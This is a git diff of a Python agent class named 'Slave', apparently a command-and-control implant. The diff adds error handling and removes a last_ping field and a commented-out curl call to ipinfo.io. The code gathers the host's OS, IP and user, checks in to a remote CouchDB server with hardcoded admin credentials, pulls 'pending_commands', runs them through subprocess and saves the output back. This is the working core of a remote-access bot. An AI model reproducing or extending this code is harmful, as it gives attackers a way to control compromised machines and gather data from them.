@@ -16,8 +16,7 @@ class Json_Format(BaseModel):
     user: str
     completed_commands: list
     pending_commands:list
-    enslaved_time: datetime
-    last_ping: str  
+    enslaved_time: datetime 
 
 class Slave(object):
     username = "admin"
@@ -32,15 +31,6 @@ class Slave(object):
         result = subprocess.run(["uname","-a"],capture_output=True)
         self.os = result.stdout.decode("utf-8")
 
-        '''
-        self.ip = subprocess.run(["curl","ipinfo.io/ip"])
-        self.ip = self.ip.stdout
-        self.user = subprocess.run(["whoami"])
-        self.user = self.user.stdout
-        self.os = subprocess.run(["uname","-a"])
-        self.os = self.os.stdout
-        '''
-
     def connect_db(self):
         self.couchserver = couchdb.Server("http://{}:{}@{}".format(self.username,self.passw,self.server_addr))
         if (self.couchserver):
@@ -51,7 +41,7 @@ class Slave(object):
 
     def initial_check_in(self):
         random_num = random.randint(10000,90000)
-        self.init_checkin = Json_Format(agent_id=random_num, OS=self.os, ip=self.ip, user=self.user, completed_commands=["initial_check_in"], pending_commands=["whoami"], enslaved_time=datetime.now(),last_ping='')
+        self.init_checkin = Json_Format(agent_id=random_num, OS=self.os, ip=self.ip, user=self.user, completed_commands=["initial_check_in"], pending_commands=["whoami"], enslaved_time=datetime.now())
         self.init_checkin = jsonable_encoder(self.init_checkin)
         print(self.init_checkin)
         print(type(self.init_checkin))
@@ -73,16 +63,25 @@ class Slave(object):
         print(cmd)
         cmd_list = cmd.split(" ")
         print(cmd_list)
-        result = subprocess.run(cmd_list,capture_output=True)
-        print(result.stdout.decode("utf-8"))
-        cmd_result = result.stdout.decode("utf-8")
-        #doc['completed_commands'] 
-        doc['completed_commands'].append({cmd:cmd_result})
-        for x in doc['pending_commands']:
-            if x == cmd:
-                doc['pending_commands'].remove(cmd)
-        print(doc)
-        self.doc_id, self.doc_rev = self.db.save(doc)
+        try:
+            result = subprocess.run(cmd_list,capture_output=True)
+            print(result.stdout.decode("utf-8"))
+            cmd_result = result.stdout.decode("utf-8")
+            #doc['completed_commands'] 
+            doc['completed_commands'].append({cmd:cmd_result})
+            for x in doc['pending_commands']:
+                if x == cmd:
+                    doc['pending_commands'].remove(cmd)
+            print(doc)
+            self.doc_id, self.doc_rev = self.db.save(doc)
+        except:
+            print("Error running command")
+            for x in doc['pending_commands']:
+                if x == cmd:
+                    doc['pending_commands'].remove(cmd)
+            doc['pending_commands'].remove(cmd)
+            self.db.save(doc)
+
 
     def main(self):
         slave = Slave()
